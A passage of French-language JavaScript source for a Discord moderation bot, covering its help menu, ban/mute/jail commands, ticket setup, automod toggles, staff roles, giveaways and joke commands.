        const description = parts.join('|').trim();

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(`**${title}**`)
            .setDescription(description)
            .setFooter({ text: `Envoyé par ${message.author.tag}`, iconURL: message.author.displayAvatarURL() });

        await message.delete().catch(() => {});
        return message.channel.send({ embeds: [embed] });
    }

    if (command === 'help') {
        const helpCategories = {
            accueil: {
                label: 'Accueil', emoji: '🏠', title: 'Accueil du Bot',
                commands: [
                    '👋 **Bienvenue sur le menu d\'aide !**\nCe bot offre une gestion complète de ton serveur (Sécurité AutoMod, Modération, Système de Tickets interactif, Giveaways et Outils).\n\n💬 Pour le moindre problème, question ou bug, contacte directement le créateur en message privé : **@graveuhq**.'
                ]
            },
            tickets: {
                label: 'Tickets', emoji: '🎫', title: 'Gestion des Tickets',
                commands: [
                    '`=ticketsetup`\n┗ Panneau visuel interactif',
                    '`=ticketadd <nom> <emoji>`\n┗ Ajouter un type',
                    '`=ticketremove <nom>`\n┗ Supprimer un type',
                    '`=setticketpanel <#salon>`\n┗ Salon du panneau',
                    '`=setticketcat <ID>`\n┗ Catégorie des tickets',
                    '`=setticketlog <#salon>`\n┗ Salon de logs',
                    '`=settickettitle <titre>`\n┗ Titre du panneau',
                    '`=setticketdesc <desc>`\n┗ Description',
                    '`=setticketimage <url|none>`\n┗ Image / GIF',
                    '`=closeticket`\n┗ Fermer un ticket'
                ]
            },
            automod: {
                label: 'AutoMod', emoji: '🛡️', title: 'Sécurité & AutoMod',
                commands: [
                    '`=antilink on / off`\n┗ Anti-lien',
                    '`=setantilink <action>`\n┗ Sanction anti-lien',
                    '`=antispam on / off`\n┗ Anti-spam',
                    '`=setantispam <action>`\n┗ Sanction anti-spam',
                    '`=antibot on / off`\n┗ Anti-bot',
                    '`=setantibot <action>`\n┗ Sanction anti-bot'
                ]
            },
            sanctions: {
                label: 'Sanctions', emoji: '🔨', title: 'Commandes Sanctions',
                commands: [
                    '`=bl <ID|@mention> [raison]`\n┗ Bannir',
                    '`=softbl <ID|@mention>`\n┗ Softban',
                    '`=unbl <ID>`\n┗ Débannir',
                    '`=blist`\n┗ Liste des bannis',
                    '`=unbanall`\n┗ Tout débannir',
                    '`=kick <ID|@mention>`\n┗ Expulser',
                    '`=mute <@membre> <durée> [raison]`\n┗ Mute',
                    '`=jail <@membre> [raison]`\n┗ Prison',
                    '`=unjail <@membre>`\n┗ Libérer',
                    '`=warn <@membre> [raison]`\n┗ Avertir'
                ]
            },
            nettoyage: {
                label: 'Nettoyage', emoji: '🧹', title: 'Nettoyage & Outils',
                commands: [
                    '`=clear <1-50>`\n┗ Supprimer des messages',
                    '`=purge <ID|@mention>`\n┗ Purger les msgs d\'un membre',
                    '`=snipe`\n┗ Dernier message supprimé',
                    '`=embed <titre> | <desc>`\n┗ Créer un embed'
                ]
            },
            salons: {
                label: 'Salons', emoji: '🔒', title: 'Salons & Vocaux',
                commands: [
                    '`=lock` / `=unlock`\n┗ Verrouiller / Déverrouiller',
                    '`=slowmode <sec>`\n┗ Mode lent',
                    '`=renew`\n┗ Régénérer le salon',
                    '`=createtext <nom>`\n┗ Créer salon texte',
                    '`=createvoice <nom>`\n┗ Créer salon vocal'
                ]
            },
            roles: {
                label: 'Rôles', emoji: '🏷️', title: 'Gestion des Rôles (Sécurisée)',
                commands: [
                    '`=addrole <@membre> <@rôle>`\n┗ Ajouter un rôle (interdit si > ton rôle max)',
                    '`=delrole <@membre> <@rôle>`\n┗ Retirer un rôle'
                ]
            },
            giveaways: {
                label: 'Giveaways', emoji: '🎉', title: 'Giveaways',
                commands: [
                    '`=gcreate <durée> <gagnants> <prix>`\n┗ Lancer un giveaway'
                ]
            },
            fun: {
                label: 'Fun', emoji: '🎮', title: 'Commandes Fun',
                commands: [
                    '`=gay [@membre]`\n┗ Test gay',
                    '`=iq [@membre]`\n┗ Test QI',
                    '`=rate [sujet]`\n┗ Rate un truc',
                    '`=horoscope [signe]`\n┗ Horoscope',
                    '`=kiss <@membre>`\n┗ Bisou'
                ]
            },
            staff: {
                label: 'Staff', emoji: '👑', title: 'Staff & Hiérarchie',
                commands: [
                    '`=owners`\n┗ Liste des owners',
                    '`=owner <@membre>` / `=unowner <@membre>`\n┗ Gérer les owners',
                    '`=admin <@membre>` / `=unadmin <@membre>`\n┗ Gérer les admins',
                    '`=mod <@membre>` / `=unmod <@membre>`\n┗ Gérer les mods',
                    '`=setlog <#salon>`\n┗ Salon de logs général',
                    '`=setwelcome <#salon> <msg>`\n┗ Salon de bienvenue'
                ]
            }
        };

        const catKeys = Object.keys(helpCategories);
        let currentIndex = 0;

        const generateEmbed = (index) => {
            const key = catKeys[index];
            const cat = helpCategories[key];
            return new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${cat.emoji} ${cat.title}`)
                .setDescription(cat.commands.join('\n\n'))
                .setFooter({ text: `Demandé par ${message.author.tag} • Page ${index + 1}/${catKeys.length}` });
        };

        const generateMenu = () => {
            return new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('help_select_menu')
                    .setPlaceholder('📁 Choisir une catégorie...')
                    .addOptions(catKeys.map(k => ({
                        label: helpCategories[k].label,
                        description: `Commandes ${helpCategories[k].label}`,
                        value: k,
                        emoji: helpCategories[k].emoji
                    })))
            );
        };

        const sentMsg = await message.reply({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] });
        const collector = sentMsg.createMessageComponentCollector({ time: 60000 });
        collector.on('collect', async i => {
            if (i.user.id !== message.author.id) return i.reply({ content: "Ce menu ne t'appartient pas !", ephemeral: true });
            currentIndex = catKeys.indexOf(i.values[0]);
            await i.update({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] }).catch(() => {});
        });
        collector.on('end', () => sentMsg.edit({ components: [] }).catch(() => {}));
        return;
    }
    if (command === 'antilink') {
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antilink = (sub === 'on');
            return message.reply(`🛡️ Anti-Link réglé sur **${sub.toUpperCase()}**`);
        }
    }

    if (command === 'setantilink') {
        const action = args[0]?.toLowerCase();
        const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
        if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
        config.antilinkAction = action;
        return message.reply(`🛡️ Sanction Anti-Link mise à jour : \`${action}\``);
    }

    if (command === 'antispam') {
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antispam = (sub === 'on');
            return message.reply(`🛡️ Anti-Spam réglé sur **${sub.toUpperCase()}**`);
        }
    }

    if (command === 'setantispam') {
        const action = args[0]?.toLowerCase();
        const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
        if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
        config.antispamAction = action;
        return message.reply(`🛡️ Sanction Anti-Spam mise à jour : \`${action}\``);
    }

    if (command === 'antibot') {
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antibot = (sub === 'on');
            return message.reply(`🛡️ Anti-Bot réglé sur **${sub.toUpperCase()}**`);
        }
    }

    if (command === 'setantibot') {
        const action = args[0]?.toLowerCase();
        const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
        if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
        config.antibotAction = action;
        return message.reply(`🛡️ Sanction Anti-Bot mise à jour : \`${action}\``);
    }

    if (command === 'gay') {
        const target = message.mentions.users.first() || message.author;
        const percent = Math.floor(Math.random() * 101);
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('🏳️‍🌈 Test Gay').setDescription(`**${target.username}** est à **${percent}%** gay !`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'iq') {
        const target = message.mentions.users.first() || message.author;
        const iq = Math.floor(Math.random() * 160) - 20;
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('🧠 Test de QI').setDescription(`Le QI de **${target.username}** est estimé à **${iq}** !`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'rate') {
        const subject = args.join(' ') || "quelque chose";
        const score = Math.floor(Math.random() * 11);
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('⭐ Rate System').setDescription(`Note : **${score}/10** pour *${subject}*`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'horoscope') {
        const sign = args[0] || "ton signe";
        const preds = ["Journée calme.", "Grosse rentrée d'argent !", "Attention à toi.", "Reste chill."];
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle(`🔮 Horoscope : ${sign}`).setDescription(preds[Math.floor(Math.random()*preds.length)]);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'kiss') {
        const target = message.mentions.users.first();
        if (!target) return message.reply("❌ Mentionne quelqu'un !");
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('💋 Bisou').setDescription(`**${message.author}** fait un bisou à **${target}** ! ❤️`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'owners') {
        const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Liste des Owners').setDescription(ownerList || "Aucun.")] });
    }

    if (command === 'owner') {
        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisateur invalide.");
        botOwners.add(targetUser.id);
        return message.reply(`👑 **${targetUser.tag}** est désormais Owner !`);
    }

    if (command === 'unowner') {
        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisateur invalide.");
        if (SUPER_OWNERS.has(targetUser.id)) return message.reply("❌ Impossible de retirer un Super Owner principal.");
        botOwners.delete(targetUser.id);
        return message.reply(`👑 **${targetUser.tag}** n'est plus Owner !`);
    }

    if (command === 'admin') {
        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisateur invalide.");
        getStaffRoles(message.guild.id).admins.add(targetUser.id);
        return message.reply(`🛡️ **${targetUser.tag}** est Admin !`);
    }

    if (command === 'unadmin') {
        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisateur invalide.");
        getStaffRoles(message.guild.id).admins.delete(targetUser.id);
        return message.reply(`🛡️ **${targetUser.tag}** n'est plus Admin !`);
    }

    if (command === 'mod') {
        if (!isSuperOwner(message) && !isAdmin(message)) return message.reply("❌ Réservé aux administrateurs.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisateur invalide.");
        getStaffRoles(message.guild.id).mods.add(targetUser.id);
        return message.reply(`🛡️ **${targetUser.tag}** est Modérateur !`);
    }

    if (command === 'unmod') {
        if (!isSuperOwner(message) && !isAdmin(message)) return message.reply("❌ Réservé aux administrateurs.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisateur invalide.");
        getStaffRoles(message.guild.id).mods.delete(targetUser.id);
        return message.reply(`🛡️ **${targetUser.tag}** n'est plus Modérateur !`);
    }
    if (command === 'ticketsetup') {
        return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: getTicketDashboardRows() });
    }

    if (command === 'ticketadd') {
        const name = args[0];
        const emoji = args[1] || '🎫';
        if (!name) return message.reply("Utilisation : `=ticketadd <Nom> <Emoji>`");
        
        const tConfig = config.ticketConfig;
        const newId = `ticket_${name.toLowerCase()}`;
        if (tConfig.categories.some(c => c.id === newId)) return message.reply("❌ Cette catégorie existe déjà.");
        
        tConfig.categories.push({ id: newId, name: name, emoji: emoji, roleId: null, description: `Ouvrir un ticket ${name}` });
        return message.reply(`✅ Catégorie de ticket **${name}** (${emoji}) ajoutée avec succès ! Ouvre \`=ticketsetup\` pour voir les changements.`);
    }

    if (command === 'ticketremove') {
        const typeName = args[0]?.toLowerCase();
        if (!typeName) return message.reply("Utilisation : `=ticketremove <Nom>`");
        const tConfig = config.ticketConfig;
        const initialLen = tConfig.categories.length;
        tConfig.categories = tConfig.categories.filter(c => c.name.toLowerCase() !== typeName && c.id !== `ticket_${typeName}`);
        if (tConfig.categories.length === initialLen) return message.reply("❌ Catégorie introuvable.");
        return message.reply(`✅ Catégorie **${typeName}** supprimée avec succès !`);
    }

    if (command === 'setticketpanel') {
        const channel = message.mentions.channels.first();
        if (!channel) return message.reply("Utilisation : `=setticketpanel <#salon>`");
        config.ticketConfig.panelChannel = channel.id;
        return message.reply(`✅ Salon du panneau défini sur ${channel} !`);
    }

    if (command === 'setticketcat') {
        const catId = args[0];
        if (!catId) return message.reply("Utilisation : `=setticketcat <ID_Catégorie>`");
        config.ticketConfig.categoryDestination = catId;
        return message.reply(`✅ Catégorie des salons-tickets définie : \`${catId}\``);
    }

    if (command === 'setticketlog') {
        const channel = message.mentions.channels.first();
        if (!channel) return message.reply("Utilisation : `=setticketlog <#salon>`");
        config.ticketConfig.logChannel = channel.id;
        return message.reply(`✅ Salon logs / transcripts défini sur ${channel} !`);
    }

    if (command === 'settickettitle') {
        const newTitle = args.join(' ');
        if (!newTitle) return message.reply("Utilisation : `=settickettitle <Titre>`");
        config.ticketConfig.title = newTitle;
        return message.reply(`✅ Titre mis à jour : **${newTitle}**`);
    }

    if (command === 'setticketdesc') {
        const newDesc = args.join(' ');
        if (!newDesc) return message.reply("Utilisation : `=setticketdesc <Description>`");
        config.ticketConfig.description = newDesc;
        return message.reply("✅ Description mise à jour.");
    }

    if (command === 'setticketimage') {
        const url = args[0];
        if (!url) return message.reply("Utilisation : `=setticketimage <url|none>`");
        config.ticketConfig.imageUrl = (url.toLowerCase() === 'none') ? null : url;
        return message.reply("✅ Image / GIF du panneau mis à jour.");
    }

    if (command === 'closeticket') {
        const channel = message.channel;
        if (!channel.name.includes('-')) return message.reply("❌ Cette commande s'utilise uniquement dans un salon de ticket.");
        await message.reply("🔒 Fermeture du ticket en cours...");
        setTimeout(() => channel.delete().catch(() => {}), 2000);
        return;
    }

    if (command === 'jail') {
        const targetMember = await fetchTargetMember(message, targetArg);
        const reason = args.slice(1).join(' ') || "Aucune raison";
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        try {
            const botRolePos = message.guild.members.me.roles.highest.position;
            const roleIds = targetMember.roles.cache.filter(r => r.id !== message.guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(targetMember.id, roleIds);
            if (roleIds.length > 0) await targetMember.roles.remove(roleIds).catch(() => {});

            const jailChan = await message.guild.channels.create({
                name: `jail-${targetMember.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: message.guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: targetMember.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
                ]
            });
            await jailChan.send({ content: `<@${targetMember.id}>`, embeds: [new EmbedBuilder().setTitle('🔒 PRISON').setDescription(`Raison : ${reason}`)] });
            return message.reply(`🔒 Membre en prison : ${jailChan}`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    if (command === 'unjail') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        try {
            const savedRoles = jailDataMap.get(targetMember.id);
            if (savedRoles && savedRoles.length > 0) {
                await targetMember.roles.add(savedRoles).catch(() => {});
                jailDataMap.delete(targetMember.id);
            }
            const jailChan = message.guild.channels.cache.find(c => c.name === `jail-${targetMember.user.username.toLowerCase()}`);
            if (jailChan) await jailChan.delete().catch(() => {});
            return message.reply(`🔓 **${targetMember.user.tag}** libéré.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }
    if (command === 'lock') {
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
        return message.reply("🔒 Salon verrouillé.");
    }

    if (command === 'unlock') {
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
        return message.reply("🔓 Salon déverrouillé.");
    }

    if (command === 'mute') {
        const targetMember = await fetchTargetMember(message, targetArg);
        const durationStr = args[1];
        const reason = args.slice(2).join(' ') || "Aucune raison";
        if (!targetMember || !durationStr) return message.reply("Utilisation : `=mute <@membre> <durée> [raison]`");
        const ms = parseDuration(durationStr);
        if (!ms) return message.reply("❌ Durée invalide.");
        await targetMember.timeout(ms, reason);
        return message.reply(`🔇 **${targetMember.user.tag}** mute.`);
    }

    if (command === 'warn') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        let userWarns = warningsMap.get(targetMember.id) || [];
        userWarns.push({ reason, moderator: message.author.tag });
        warningsMap.set(targetMember.id, userWarns);
        return message.reply(`⚠️ Warn enregistré (${userWarns.length}).`);
    }

    if (command === 'setlog') {
        const channel = message.mentions.channels.first() || message.channel;
        config.logChannel = channel.id;
        return message.reply(`✅ Salon de logs défini sur ${channel} !`);
    }

    if (command === 'setwelcome') {
        const channel = message.mentions.channels.first();
        const welcomeText = args.slice(1).join(' ');
        if (!channel || !welcomeText) return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
        config.welcomeChannel = channel.id;
        config.welcomeText = welcomeText;
        return message.reply(`✅ Salon de bienvenue configuré !`);
    }

    if (command === 'gcreate') {
        const duration = args[0], winnersCount = parseInt(args[1]), prize = args.slice(2).join(' ');
        if (!duration || isNaN(winnersCount) || !prize) return message.reply("Utilisation : `=gcreate <durée> <gagnants> <prix>`");
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle("🎉 GIVEAWAY 🎉").setDescription(`**Lot :** ${prize}\n**Gagnants :** ${winnersCount}`);
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success));
        await message.channel.send({ embeds: [embed], components: [row] });
        return message.reply("🎉 Giveaway lancé !");
    }

    if (command === 'bl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("ID ou mention invalide.");
        await message.guild.members.ban(targetUser.id);
        return message.reply(`🔨 **${targetUser.tag}** banni.`);
    }

    else if (command === 'softbl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("ID invalide.");
        await message.guild.members.ban(targetUser.id, { deleteMessageSeconds: 604800 });
        await message.guild.members.unban(targetUser.id);
        return message.reply(`🌪️ Softban effectué.`);
    }

    else if (command === 'unbl') {
        const userId = targetArg?.replace(/<@!?|>/g, '');
        if (!userId) return message.reply("ID requis.");
        await message.guild.members.unban(userId);
        return message.reply(`🔓 Débanni.`);
    }

    else if (command === 'blist') {
        const bans = await message.guild.bans.fetch();
        const banList = bans.map(b => `• **${b.user.tag}**`).slice(0, 15).join('\n') || "Aucun.";
        return message.reply({ embeds: [new EmbedBuilder().setTitle("🔨 Bannissements").setDescription(banList)] });
    }

    else if (command === 'unbanall') {
        const bans = await message.guild.bans.fetch();
        for (const [id] of bans) await message.guild.members.unban(id).catch(() => {});
        return message.reply(`🔓 Tous débannis (${bans.size}).`);
    }

    else if (command === 'kick') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);
        if (!member) return message.reply("Membre introuvable.");
        await member.kick();
        return message.reply(`✅ Expulsé.`);
    }

    else if (command === 'clear') {
        const count = parseInt(args[0]);
        if (isNaN(count) || count < 1 || count > 50) return message.reply("❌ Entre 1 et 50.");
        await message.delete();
        const fetched = await message.channel.messages.fetch({ limit: count });
        await message.channel.bulkDelete(fetched, true);
        return;
    }

    else if (command === 'purge') {
        const targetUser = await fetchTargetMember(message, targetArg);
        if (!targetUser) return message.reply("Membre introuvable.");
        const fetched = await message.channel.messages.fetch({ limit: 100 });
        const userMsgs = fetched.filter(m => m.author.id === targetUser.id).first(30);
        await message.channel.bulkDelete(userMsgs, true);
        return;
    }

    else if (command === 'snipe') {
        const sniped = snipeCache.get(message.channel.id);
        if (!sniped) return message.reply("❌ Aucun message.");
        return message.reply({ embeds: [new EmbedBuilder().setAuthor({ name: sniped.author }).setDescription(sniped.content)] });
    }

    else if (command === 'slowmode') {
        const sec = parseInt(args[0]);
        await message.channel.setRateLimitPerUser(sec);
        return message.reply(`⏱️ Mode lent : ${sec}s.`);
    }

    else if (command === 'renew') {
        const newChan = await message.channel.clone();
        await message.channel.delete();
        newChan.send("🔄 Salon régénéré !");
    }

    else if (command === 'createtext') {
        await message.guild.channels.create({ name: args.join('-'), type: ChannelType.GuildText });
        return message.reply("✅ Salon texte créé.");
    }

    else if (command === 'createvoice') {
        await message.guild.channels.create({ name: args.join(' '), type: ChannelType.GuildVoice });
        return message.reply("✅ Salon vocal créé.");
    }

    else if (command === 'addrole') {
        const member = await fetchTargetMember(message, targetArg);
        const role = message.mentions.roles.first();
        if (!member || !role) return message.reply("Utilisation : `=addrole <@membre> <@rôle>`");
        
        if (!isSuperOwner(message) && !isOwner(message)) {
            const authorHighest = message.member.roles.highest.position;
            if (role.position >= authorHighest) {
                return message.reply("❌ Tu ne peux pas attribuer un rôle supérieur ou égal à ton propre rôle le plus haut.");
            }
        }

        await member.roles.add(role);
        return message.reply(`✅ Rôle ${role.name} ajouté à ${member.user.tag}.`);
    }

    else if (command === 'delrole') {
        const member = await fetchTargetMember(message, targetArg);
        const role = message.mentions.roles.first();
        if (!member || !role) return message.reply("Utilisation : `=delrole <@membre> <@rôle>`");

        if (!isSuperOwner(message) && !isOwner(message)) {
            const authorHighest = message.member.roles.highest.position;
            if (role.position >= authorHighest) {
                return message.reply("❌ Tu ne peux pas retirer un rôle supérieur ou égal à ton propre rôle le plus haut.");
            }
        }

        await member.roles.remove(role);
        return message.reply(`✅ Rôle ${role.name} retiré à ${member.user.tag}.`);
    }
});

client.login(process.env.DISCORD_TOKEN);
